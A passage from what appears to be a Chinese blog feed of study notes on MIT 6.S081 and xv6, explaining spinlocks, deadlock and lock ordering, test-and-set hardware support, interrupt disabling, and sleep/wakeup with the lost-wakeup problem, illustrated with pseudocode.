CPU。</strong></p><p>自旋锁开销少，在多核系统下一般不会主动产生线程切换，适合异步、协程等在用户态切换请求的编程方式，但如果被锁住的代码执行时间过长，自旋的线程会长时间占用CPU资源，所以自旋的时间和被锁住的代码执行的时间是成「正比」的关系，我们需要清楚的知道这一点。</p><h2 id="锁抽象">锁抽象</h2><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">struct</span> <span class="hljs-keyword">lock</span>&#123;<br>&#125;<br>acuire(&amp;<span class="hljs-keyword">lock</span>) =&gt; 只有一个进程可以获得锁<br><span class="hljs-comment"><span class="hljs-doctag">///</span><span class="hljs-doctag">///</span><span class="hljs-doctag">///</span>这一部分是临界区代码，是原子性的</span><br>release(&amp;<span class="hljs-keyword">lock</span>)<br><br><span class="hljs-keyword">struct</span> spinlock &#123;<br><span class="hljs-built_in">uint</span> locked;<br><span class="hljs-built_in">char</span> *name;<br><span class="hljs-keyword">struct</span> cpu *cpu;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="什么时候使用锁">什么时候使用锁</h2><p>两个以上进程共享一个数据结构的时候</p><p>lock perspectives</p><ol type="1"><li>locks help avoid lost updates</li><li>locks make most step atomic</li><li>locks help maintain invariant</li></ol><h2 id="dead-lock">Dead Lock</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus">case <span class="hljs-number">1</span>:<br><span class="hljs-function"><span class="hljs-title">acquire</span><span class="hljs-params">(&amp;l)</span></span><br><span class="hljs-function"><span class="hljs-title">acquire</span><span class="hljs-params">(&amp;l)</span></span><br><br>case <span class="hljs-number">2</span>:<br><span class="hljs-function"><span class="hljs-title">acquire</span><span class="hljs-params">(&amp;d1)</span></span><br><span class="hljs-function"><span class="hljs-title">acquire</span><span class="hljs-params">(&amp;d2)</span></span><br><span class="hljs-function"><span class="hljs-title">acquire</span><span class="hljs-params">(&amp;d2)</span></span><br><span class="hljs-function"><span class="hljs-title">acquire</span><span class="hljs-params">(&amp;d1)</span></span><br></code></pre></td></tr></table></figure><p>解决方法：锁排序</p><p>m1.g() &lt;=&gt;m2.f()</p><p>m2中的锁必须对m1可见（无锁编程里m2不需要知道m1的任何信息）</p><p>性能：</p><p>need to split up data structures</p><h2 id="锁原理">锁原理</h2><p>先看一个基本的模拟锁的代码：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs abnf">Broken acquire(struct lock *l) &#123;<br>while (<span class="hljs-number">1</span>) &#123;<br>if (l -&gt; locked <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-number">0</span>) &#123;<br>l -&gt; locked <span class="hljs-operator">=</span> <span class="hljs-number">1</span><span class="hljs-comment">;</span><br>return<span class="hljs-comment">;</span><br>&#125;<br>&#125;<br>&#125;<br><br>这个实现有问题，假设有两个cpu核心，都同时运行到了if语句，这个时候也会同时执行到if内部的语句，这就会导致问题，这是没办法的，因为仅仅从软件没有办法控制CPU的执行顺序；所以必须得依赖硬件指令才能解决这个问题。<br></code></pre></td></tr></table></figure><p>锁的实现依赖于硬件支持</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">硬件的test andset support(测试和设置保证)<br>amoswapaddr1, reg1, reg2，这个指令做了以下内容：<br>lock addr(锁定地址)<br>tmp &lt;- *addr<br>*addr &lt;- r1<br>r2 &lt;- tmp<br>unlock<br><br>为什么叫测试和设置<br>测试：判断被锁定地址的值为<span class="hljs-number">0</span>还是<span class="hljs-number">1</span>？<br>设置：设置锁定地址的值<br><br>acquire(spinlock *lk) &#123;<br>push<span class="hljs-constructor">_off()</span> <span class="hljs-comment">// 禁用中断</span><br><span class="hljs-keyword">while</span>(<span class="hljs-constructor">__sync_lock_test_and_set(&amp;<span class="hljs-params">lk</span>-&lt;<span class="hljs-params">locked</span>, 1)</span> != <span class="hljs-number">0</span>);<br><span class="hljs-constructor">__sync_synchronize()</span>;<br>lk-&gt;cpu = mucpu<span class="hljs-literal">()</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><code>Q: 为什么acquire里要禁用中断？</code>因为不禁用中断的话，这个时候有中断进来，会调用uartintr,而uartintr会获取同一把锁，如果是仅有一个cpu的架构，这个时候就没有cpu可以处理这个新来的中断</p><h3 id="内存屏障和内存排序">内存屏障和内存排序</h3><p>某些编译器或者处理器对编译后的代码做优化，导致锁临界区间的代码被重调了，xv6有个内存屏障(synchronize)防止内存排序，_sync_synchronize()，在这个点之前的保存或存储不允许移动到这个点之后。</p><h2 id="锁">锁</h2><p>首先，我们来看一下为什么我们需要锁？故事要从应用程序想要使用多个CPU核开始。使用多个CPU核可以带来性能的提升，如果一个应用程序运行在多个CPU核上，并且执行了系统调用，那么内核需要能够处理并行的系统调用。如果系统调用并行的运行在多个CPU核上，那么它们可能会并行的访问内核中共享的数据结构。到目前为止，你们也看到了XV6有很多共享的数据结构，例如<strong>proc</strong>、<strong>ticks</strong>和我们之后会看到的<strong>buffercache</strong>等等。当并行的访问数据结构时，例如一个核在读取数据，另一个核在写入数据，我们需要使用锁来协调对于共享数据的更新，以确保数据的一致性。所以，我们需要锁来控制并确保共享的数据是正确的。</p><p>但是实际的情况有些令人失望，因为我们想要通过并行来获得高性能，我们想要并行的在不同的CPU核上执行系统调用，但是如果这些系统调用使用了共享的数据，<strong>我们又需要使用锁，而锁又会使得这些系统调用串行执行，所以最后锁反过来又限制了性能。</strong></p><p>所以现在我们处于一个矛盾的处境，出于正确性，我们需要使用锁，但是考虑到性能，锁又是极不好的。这就是现实，我们接下来会看看如何改善这个处境。</p><p>那为什么要使用锁呢？前面我们已经提到了，是为了确保正确性。当一份共享数据同时被读写时，如果没有锁的话，可能会出现racecondition，进而导致程序出错。</p><p>首先你们在脑海里应该有多个CPU核在运行，比如说CPU0在运行指令，CPU1也在运行指令，这两个CPU核都连接到同一个内存上。在前面的代码中，数据freelist位于内存中，它里面记录了2个内存page。假设两个CPU核在相同的时间调用kfree。</p><h3 id="锁如何避免race-condition">锁如何避免race condition</h3><p>首先你们在脑海里应该有多个CPU核在运行，比如说CPU0在运行指令，CPU1也在运行指令，这两个CPU核都连接到同一个内存上。在前面的代码中，数据freelist位于内存中，它里面记录了2个内存page。假设两个CPU核在相同的时间调用kfree。</p><p>kfree函数接收一个物理地址pa作为参数，freelist是个单链表，kfree中将pa作为单链表的新的head节点，并更新freelist指向pa（注，也就是将空闲的内存page加在单链表的头部）。当两个CPU都调用kfree时，CPU0想要释放一个page，CPU1也想要释放一个page，现在这两个page都需要加到freelist中。</p><p>kfree中首先将对应内存page的变量r指向了当前的freelist（也就是单链表当前的head节点）。我们假设CPU0先运行，那么CPU0会将它的变量r的next指向当前的freelist。如果CPU1在同一时间运行，它可能在CPU0运行第二条指令（kmem.freelist=r）之前运行代码。所以它也会完成相同的事情，它会将自己的变量r的next指向当前的freelist。现在两个物理page对应的变量r都指向了同一个freelist（注，也就是原来单链表的head节点）。</p><p>接下来，剩下的代码也会并行的执行（kmem.freelist =r），这行代码会更新freelist为r。因为我们这里只有一个内存，所以总是有一个CPU会先执行，另一个后执行。我们假设CPU0先执行，那么freelist会等于CPU0的变量r。之后CPU1再执行，它又会将freelist更新为CPU1的变量r。这样的结果是，我们丢失了CPU0对应的page。CPU0想要释放的内存page最终没有出现在freelist数据中。</p><p>这是一种具体的坏的结果，当然可能会有更多坏的结果，因为可能会有更多的CPU。例如第三个CPU可能会短暂的发现freelist等于CPU0对应的变量r，并且使用这个page，但是之后很快freelist又被CPU1更新了。所以，拥有越多的CPU，我们就可能看到比丢失page更奇怪的现象。</p><h3 id="锁的作用">锁的作用</h3><p>通常锁有三种作用，理解它们可以帮助你更好的理解锁。</p><ul><li>锁可以避免丢失更新。如果你回想我们之前在kalloc.c中的例子，丢失更新是指我们丢失了对于某个内存page在kfree函数中的更新。如果没有锁，在出现racecondition的时候，内存page不会被加到freelist中。但是加上锁之后，我们就不会丢失这里的更新。</li><li>锁可以打包多个操作，使它们具有原子性。我们之前介绍了加锁解锁之间的区域是criticalsection，在critical section的所有操作会都会作为一个原子操作执行。</li><li>锁可以维护共享数据结构的不变性。共享数据结构如果不被任何进程修改的话是会保持不变的。如果某个进程acquire了锁并且做了一些更新操作，共享数据的不变性暂时会被破坏，但是在release锁之后，数据的不变性又恢复了。你们可以回想一下之前在kfree函数中的freelist数据，所有的freepage都在一个单链表上。但是在kfree函数中，这个单链表的head节点会更新。freelist并不太复杂，对于一些更复杂的数据结构可能会更好的帮助你理解锁的作用</li></ul><p>接下来我们再来看一下锁可能带来的一些缺点。我们已经知道了锁可以被用来解决一些正确性问题，例如避免racecondition。但是不恰当的使用锁，可能会带来一些锁特有的问题。最明显的一个例子就是死锁（Deadlock）。</p><p>一个死锁的最简单的场景就是：首先acquire一个锁，然后进入到criticalsection；在criticalsection中，再acquire同一个锁；第二个acquire必须要等到第一个acquire状态被release了才能继续执行，但是不继续执行的话又走不到第一个release，所以程序就一直卡在这了。这就是一个死锁。XV6会探测这样的死锁，如果XV6看到了同一个进程多次acquire同一个锁，就会触发一个panic。</p><p>当有多个锁的时候，场景会更加有趣。假设现在我们有两个CPU，一个是CPU1，另一个是CPU2。CPU1执行rename将文件d1/x移到d2/y，CPU2执行rename将文件d2/a移到d1/b。这里CPU1将文件从d1移到d2，CPU2正好相反将文件从d2移到d1。我们假设我们按照参数的顺序来acquire锁，那么CPU1会先获取d1的锁，如果程序是真正的并行运行，CPU2同时也会获取d2的锁。之后CPU1需要获取d2的锁，这里不能成功，因为CPU2现在持有锁，所以CPU1会停在这个位置等待d2的锁释放。而另一个CPU2，接下来会获取d1的锁，它也不能成功，因为CPU1现在持有锁。这也是死锁的一个例子，有时候这种场景也被称为deadlyembrace。这里的死锁就没那么容易探测了。</p><p>这里的解决方案是，如果你有多个锁，你需要对锁进行排序，所有的操作都必须以相同的顺序获取锁。</p><p>所以对于一个系统设计者，你需要确定对于所有的锁对象的全局的顺序。例如在这里的例子中我们让d1一直在d2之前，这样我们在rename的时候，总是先获取排序靠前的目录的锁，再获取排序靠后的目录的锁。如果对于所有的锁有了一个全局的排序，这里的死锁就不会出现了。</p><p>不过在设计一个操作系统的时候，定义一个全局的锁的顺序会有些问题。如果一个模块m1中方法g调用了另一个模块m2中的方法f，那么m1中的方法g需要知道m2的方法f使用了哪些锁。因为如果m2使用了一些锁，那么m1的方法g必须集合f和g中的锁，并形成一个全局的锁的排序。这意味着在m2中的锁必须对m1可见，这样m1才能以恰当的方法调用m2。</p><p>但是这样又违背了代码抽象的原则。在完美的情况下，代码抽象要求m1完全不知道m2是如何实现的。但是不幸的是，具体实现中，m2内部的锁需要泄露给m1，这样m1才能完成全局锁排序。所以当你设计一些更大的系统时，锁使得代码的模块化更加的复杂了。</p><h3 id="uart">Uart</h3><p>可以认为对于UART模块来说，现在是一个coarse-grainedlock的设计。这个锁保护了UART的的传输缓存；写指针；读指针。当我们传输数据时，写指针会指向传输缓存的下一个空闲槽位，而读指针指向的是下一个需要被传输的槽位。这是我们对于并行运算的一个标准设计，它叫做消费者-生产者模式。</p><p>所以现在有了一个缓存，一个写指针和一个读指针。读指针的内容需要被显示，写指针接收来自例如printf的数据。我们前面已经了解到了锁有多个角色。第一个是保护数据结构的特性不变，数据结构有一些不变的特性，例如读指针需要追赶写指针；从读指针到写指针之间的数据是需要被发送到显示端；从写指针到读指针之间的是空闲槽位，锁帮助我们维护了这些特性不变。</p><h3 id="spin-lock实现">Spin lock实现</h3><p>我们看一下spinlock.c文件，先来看一下acquire函数，在函数中有一个while循环，这就是我刚刚提到的test-and-set循环。实际上C的标准库已经定义了这些原子操作，所以C标准库中已经有一个函数__sync_lock_test_and_set，它里面的具体行为与我刚刚描述的是一样的。因为大部分处理器都有的test-and-set硬件指令，所以这个函数的实现比较直观。我们可以通过查看kernel.asm来了解RISC-V具体是如何实现的。下图就是atomicswap操作。</p><p>这里比较复杂，总的来说，一种情况下我们跳出循环，另一种情况我们继续执行循环。C代码就要简单的多。如果锁没有被持有，那么锁对象的locked字段会是0，如果locked字段等于0，我们调用test-and-set将1写入locked字段，并且返回locked字段之前的数值0。如果返回0，那么意味着没有人持有锁，循环结束。如果locked字段之前是1，那么这里的流程是，先将之前的1读出，然后写入一个新的1，但是这不会改变任何数据，因为locked之前已经是1了。之后__sync_lock_test_and_set会返回1，表明锁之前已经被人持有了，这样的话，判断语句不成立，程序会持续循环（spin），直到锁的locked字段被设置回0。</p><blockquote><p>有很多同学提问说为什么release函数中不直接使用一个store指令将锁的locked字段写为0？有人想回答一下为什么吗？</p><p>是的，可能有两个处理器或者两个CPU同时在向locked字段写入数据。这里的问题是，对于很多人包括我自己来说，经常会认为一个store指令是一个原子操作，但实际并不总是这样，这取决于具体的实现。例如，对于CPU内的缓存，每一个cacheline的大小可能大于一个整数，那么store指令实际的过程将会是：首先会加载cacheline，之后再更新cacheline。所以对于store指令来说，里面包含了两个微指令。这样的话就有可能得到错误的结果。所以为了避免理解硬件实现的所有细节，例如整数操作不是原子的，或者向一个64bit的内存值写数据是不是原子的，我们直接使用一个RISC-V提供的确保原子性的指令来将locked字段写为0。</p></blockquote><p>第二个细节是，在acquire函数的最开始，会先关闭中断。为什么会是这样呢？让我们回到uart.c中。我们先来假设acquire在一开始并没有关闭中断。在uartputc函数中，首先会acquire锁，如果不关闭中断会发生什么呢？</p><p>uartputc函数会acquire锁，UART本质上就是传输字符，当UART完成了字符传输它会做什么？是的，它会产生一个中断之后会运行uartintr函数，在uartintr函数中，会获取同一把锁，但是这把锁正在被uartputc持有。如果这里只有一个CPU的话，那这里就是死锁。中断处理程序uartintr函数会一直等待锁释放，但是CPU不出让给uartputc执行的话锁又不会释放。在XV6中，这样的场景会触发panic，因为同一个CPU会再次尝试acquire同一个锁。</p><p>所以spinlock需要处理两类并发，一类是不同CPU之间的并发，一类是相同CPU上中断和普通程序之间的并发。针对后一种情况，我们需要在acquire中关闭中断。中断会在release的结束位置再次打开，因为在这个位置才能再次安全的接收中断</p>]]></content>
    
    
    <categories>
      
      <category>操作系统</category>
      
    </categories>
    
    
    <tags>
      
      <tag>操作系统，计算机基础, C</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Sleep &amp; Wakeup</title>
    <link href="/emocoder/2023/10/05/oslearning/mit-6.s081/wake&amp;sleep/wake&amp;sleep/"/>
    <url>/emocoder/2023/10/05/oslearning/mit-6.s081/wake&amp;sleep/wake&amp;sleep/</url>
    
    <content type="html"><![CDATA[<p>像锁一样，sleep是另一种帮助程序线性化的工具</p><p>场景：</p><ol type="1"><li>等待管道有数据</li><li>等待磁盘读取完成</li><li>wait系统调用，等待子进程完成某个事件</li></ol><p>以软件的形式模拟：</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">Busy wait:<br><span class="hljs-keyword">while</span> pipe buf <span class="hljs-keyword">is</span> empty &#123;&#125; <span class="hljs-comment">// 这样cpu空转，浪费cpu资源，最好的做饭是类似swtch一样学会放弃cpu，直到某个事件发生，才重新拥有cpu控制权，sleep和wakeup就是做这件事情的</span><br><span class="hljs-keyword">return</span> the <span class="hljs-keyword">data</span><br></code></pre></td></tr></table></figure><p>教授重写了UART的驱动代码：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs awk">uartwrite (char buf[], int n) <span class="hljs-regexp">//</span> 驱动——处理输入，写入控制台的函数，写入硬件，每次一个字符one by one，由于uart每次只能写入一个字符，但实际情况一般是有很多字符，所以需要等待uart硬件处理完了，才继续发送下一个字符<br><span class="hljs-keyword">while</span> (i &lt; n) &#123;  <span class="hljs-regexp">//</span> buf size是<span class="hljs-number">16</span>，每<span class="hljs-number">16</span>个字符就有一次中断<br><span class="hljs-keyword">while</span> (tx_done == <span class="hljs-number">0</span>) &#123; <span class="hljs-regexp">//</span> 表明硬件还没准备好<br>sleep(&amp;tx_chan, &amp;uart_tx_lock); <span class="hljs-regexp">//</span> 硬件没准备好，就去睡觉，不要占着茅坑不拉屎<br>&#125;<br><span class="hljs-regexp">//</span> 否则硬件已经准备好了<br>WriteReg(THR, buf[i]) <span class="hljs-regexp">//</span> buf是缓冲区的字符集，THR是硬件的传输寄存器<br>i += <span class="hljs-number">1</span>;<br>tx+ done = <span class="hljs-number">0</span> <span class="hljs-regexp">//</span> 重置状态<br>&#125;<br><br>uartintr() <span class="hljs-regexp">//</span> 驱动——处理中断<br>acquire(&amp;uart_tx_lock)<br><span class="hljs-keyword">if</span> (ReadReg(LSR) &amp; LSR_TX_IDLE) &#123; <span class="hljs-regexp">//</span> 硬件读取完成读取当前字符<br>tx_done = <span class="hljs-number">1</span>; <span class="hljs-regexp">//</span> 重置状态为<span class="hljs-number">1</span><br>wakeup(&amp;tx_chan); <span class="hljs-regexp">//</span> 唤醒uartwrite，uartwrite重新掌握cou控制权<br>&#125;<br></code></pre></td></tr></table></figure><p>lost &amp;wakeup原理：</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs xl">broken_sleep(channel) &#123;<br><span class="hljs-function"><span class="hljs-title">p</span> -&gt;</span> state = SLEEPING;<br><span class="hljs-function"><span class="hljs-title">p</span>-&gt;</span>channel = channel<br>swtch()<br>&#125;<br><br>wakeup(channel) &#123;<br><span class="hljs-keyword">for</span> each p <span class="hljs-built_in">in</span> procs[] &#123;<br><span class="hljs-function"><span class="hljs-title">if</span> (p -&gt;</span><span class="hljs-function"><span class="hljs-title">state</span> == SLEEPING &amp;&amp; p -&gt;</span> channel == channel) &#123;<br><span class="hljs-function"><span class="hljs-title">p</span>-&gt;</span>state = RUNNABLE;<br>&#125;<br>&#125;<br>&#125;<br><br>为什么要有channel呢？没有行不行？<br>int done<br>uartwrite(buf) &#123;<br><span class="hljs-keyword">for</span> each c <span class="hljs-built_in">in</span> buf &#123;<br>Lock<br><span class="hljs-keyword">while</span> <span class="hljs-built_in">not</span> done &#123;<br>sleep(&amp;tx_chan)<br>&#125;<br>send c<br>done<br>unLock<br>&#125;<br>&#125;<br><br>intr() &#123;<br>Lock<br>done = <span class="hljs-number">1</span><br>wakeup(&amp;tx_chan)<br>unLock<br>&#125;<br><br>两个例程必须含锁，因为有一个共享数据结构buf；另外它们还共同访问同一个硬件，为了避免竞态条件，必须使用锁。锁加在哪里呢？<br>上面代码会导致死锁，因为中断触发的时候又加了一次锁，导致never wakeu up<br><br>所以一种解决办法是在sleep之前unlock，这样就给了中断例程去执行代码，然后wakeup，再在sleep之后acquire，放在在执行write的时候其他进程影响，<br>uartwrite(buf) &#123;<br><span class="hljs-keyword">for</span> each c <span class="hljs-built_in">in</span> buf &#123;<br>Lock<br><span class="hljs-keyword">while</span> <span class="hljs-built_in">not</span> done &#123;<br>unLock<br>broken_sleep(&amp;tx_chan)<br>Lock<br>&#125;<br>send c<br>done<br>unLock<br>&#125;<br>&#125;<br><br>但是这样还会有问题<br><br>事实上教授的演示里，是多个核心的，其他核心上确实发生了中断，但是中断发生的时候还没有执行到broken_sleep（差一行），这就会导致wakeup的时候，并没有唤醒任何东西；然后后面才sleep，这就是所谓的wakeup lost问题<br><br>但是有时候wakeup lost会意外地修复自己？<br>因为这里uart只有一个中断例程，无论是信号输入还是信号完成输出，所以当教授重新键入的时候，触发信号输入，触发中断，会重新wakeup，可能帮助之前的sleep wakeup了<br><br>那sleep到底如何实现呢？<br>出现上面case的本质原因是release之后，sleep的操作不是原子性的，导致了会被中断，有没有一直方法让sleep成为原子性的？<br>加另一把锁：<br><span class="hljs-function"><span class="hljs-title">if</span> (lk != &amp;p-&gt;</span>lock) &#123;<br><span class="hljs-function"><span class="hljs-title">acquire</span>(&amp;p-&gt;</span>lock); <span class="hljs-comment">// 另一把锁，这里直接用了进程锁</span><br>unLock; <span class="hljs-comment">// 同时释放之前的条件锁，这个时候中断进程可以执行wakeup了，但是由于wakeup的时候，又被进程锁拦截了，导致没办法立即恢复运行，所以就SLEEP了</span><br>&#125;<br><span class="hljs-comment">// Go to sleep</span><br>p-chan = chan<br><span class="hljs-function"><span class="hljs-title">p</span>-&gt;</span>state = SLEEPING<br><br>sched() =&gt; 切换到调度器线程schedule的时候，会释放最近一次的运行的进程锁<br><br><span class="hljs-function"><span class="hljs-title">p</span>-&gt;</span>chan = <span class="hljs-number">0</span>;<br><br><span class="hljs-function"><span class="hljs-title">if</span> (lk != &amp;p-&gt;</span>lock) &#123;<br><span class="hljs-function"><span class="hljs-title">release</span>(&amp;p-&gt;</span>lock); <span class="hljs-comment">// 另一把锁，这里直接用了进程锁</span><br>Lock;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>一旦加了锁之后，进程就会在cpu上自旋，一直运行，除非release，也不允许中断</p></blockquote><h2 id="sleep-wakeup">Sleep &amp; wakeup</h2><p>在XV6中，任何时候调用switch函数都会从一个线程切换到另一个线程，通常是在用户进程的内核线程和调度器线程之间切换。在调用switch函数之前，总是会先获取线程对应的用户进程的锁。所以过程是这样，一个进程先获取自己的锁，然后调用switch函数切换到调度器线程，调度器线程再释放进程锁。</p><p>实际上的代码顺序更像这样：</p><ol type="1"><li>一个进程出于某种原因想要进入休眠状态，比如说出让CPU或者等待数据，它会先获取自己的锁；</li><li>之后进程将自己的状态从RUNNING设置为RUNNABLE；</li><li>之后进程调用switch函数，其实是调用sched函数在sched函数中再调用的switch函数；</li><li>switch函数将当前的线程切换到调度器线程；</li><li>调度器线程之前也调用了switch函数，现在恢复执行会从自己的switch函数返回；</li><li>返回之后，调度器线程会释放刚刚出让了CPU的进程的锁</li></ol><p>在第1步中获取进程的锁的原因是，这样可以阻止其他CPU核的调度器线程在当前进程完成切换前，发现进程是RUNNABLE的状态并尝试运行它。为什么要阻止呢？因为其他每一个CPU核都有一个调度器线程在遍历进程表单，如果没有在进程切换的最开始就获取进程的锁的话，其他CPU核就有可能在当前进程还在运行时，认为该进程是RUNNABLE并运行它。而两个CPU核使用同一个栈运行同一个线程会使得系统立即崩溃。</p><p>所以，在进程切换的最开始，进程先获取自己的锁，并且直到调用switch函数时也不释放锁。而另一个线程，也就是调度器线程会在进程的线程完全停止使用自己的栈之后，再释放进程的锁。释放锁之后，就可以由其他的CPU核再来运行进程的线程，因为这些线程现在已经不在运行了。</p><blockquote><p>学生提问：当我们有多个CPU核时，它们能看到同样的锁对象的唯一原因只可能是它们有一个共享的物理内存系统，对吧？</p><p>Robert教授：是的。如果你有两个电脑，那么它们不会共享内存，并且我们就不会有这些问题。现在的处理器上，总是有多个CPU核，它们共享了相同的内存系统。</p></blockquote><p>在线程切换的过程中，还有一点我之前没有提过。XV6中，不允许进程在执行switch函数的过程中，持有任何其他的锁。所以，进程在调用switch函数的过程中，必须要持有p-&gt;lock（注，也就是进程对应的proc结构体中的锁），但是同时又不能持有任何其他的锁。这也是包含了Sleep在内的很多设计的限制条件之一。如果你是一个XV6的程序员，你需要遵循这条规则。接下来让我解释一下背后的原因，首先构建一个不满足这个限制条件的场景：</p><p>我们有进程P1，P1的内核线程持有了p-&gt;lock以外的其他锁，这些锁可能是在使用磁盘，UART，console过程中持有的。之后内核线程在持有锁的时候，通过调用switch/yield/sched函数出让CPU，这会导致进程P1持有了锁，但是进程P1又不在运行。</p><p>假设我们在一个只有一个CPU核的机器上，进程P1调用了switch函数将CPU控制转给了调度器线程，调度器线程发现还有一个进程P2的内核线程正在等待被运行，所以调度器线程会切换到运行进程P2。假设P2也想使用磁盘，UART或者console，它会对P1持有的锁调用acquire，这是对于同一个锁的第二个acquire调用。当然这个锁现在已经被P1持有了，所以这里的acquire并不能获取锁。假设这里是spinlock，那么进程P2会在一个循环里不停的“旋转”并等待锁被释放。但是很明显进程P2的acquire不会返回，所以即使进程P2稍后愿意出让CPU，P2也没机会这么做。之所以没机会是因为P2对于锁的acquire调用在直到锁释放之前都不会返回，而唯一锁能被释放的方式就是进程P1恢复执行并在稍后release锁，但是这一步又还没有发生，因为进程P1通过调用switch函数切换到了P2，而P2又在不停的“旋转”并等待锁被释放。这是一种死锁，它会导致系统停止运行。</p><p>虽然刚刚的描述是基于机器上只有一个CPU核，但是你可以通过多个锁在多个CPU核的机器上构建类似的死锁场景。所以，我们在XV6中禁止在调用switch时持有除进程自身锁（注，也就是p-&gt;lock）以外的其他锁。</p><blockquote><p>学生提问：难道定时器中断不会将CPU控制切换回进程P1从而解决死锁的问题吗？</p><p>Robert教授：首先，所有的进程切换过程都发生在内核中，所有的acquire，switch，release都发生在内核代码而不是用户代码。实际上XV6允许在执行内核代码时触发中断，如果你查看trap.c中的代码你可以发现，如果XV6正在执行内核代码时发生了定时器中断，中断处理程序会调用yield函数并出让CPU。</p><p>但是在之前的课程中我们讲过acquire函数在等待锁之前会关闭中断，否则的话可能会引起死锁（注，详见10.8），所以我们不能在等待锁的时候处理中断。所以如果你查看XV6中的acquire函数，你可以发现函数中第一件事情就是关闭中断，之后再“自旋”等待锁释放。你或许会想，为什么不能先“自旋”等待锁释放，再关闭中断？因为这样会有一个短暂的时间段锁被持有了但是中断没有关闭，在这个时间段内的设备的中断处理程序可能会引起死锁。</p><p>所以不幸的是，当我们在自旋等待锁释放时会关闭中断，进而阻止了定时器中断并且阻止了进程P2将CPU出让回给进程P1。嗯，这是个好问题。</p><p>学生提问：能重复一下死锁是如何避免的吗？</p><p>Robert教授：哦，在XV6中，死锁是通过禁止在线程切换的时候加锁来避免的。</p><p>XV6禁止在调用switch函数时，获取除了p-&gt;lock以外的其他锁。如果你查看sched函数的代码（注，详见11.6），里面包含了一些检查代码来确保除了p-&gt;lock以外线程不持有其他锁。所以上面会产生死锁的代码在XV6中是不合法的并被禁止的。</p></blockquote><p>前面我们介绍了在UART的驱动中，如何使用sleep和wakeup才能避免lostwakeup。前面这个特定的场景中，sleep等待的condition是发生了中断并且硬件准备好了传输下一个字符。在一些其他场景，内核代码会调用sleep函数并等待其他的线程完成某些事情。这些场景从概念上来说与我们介绍之前的场景没有什么区别，但是感觉上还是有些差异。例如，在读写pipe的代码中，如果你查看pipe.c中的piperead函数</p><figure><imgsrc="https://tnrhmtc0g9.feishu.cn/space/api/box/stream/download/asynccode/?code=MGNiNmViZjViNmVkOTBjM2IyNGY1NWQ0MTVlM2M2YmVfTlNLWGN1RnFURTdMRFhuUkFSU2hObUNSZ3Fub1U4ZnhfVG9rZW46UUZrbWJEcVVib1BUWEV4d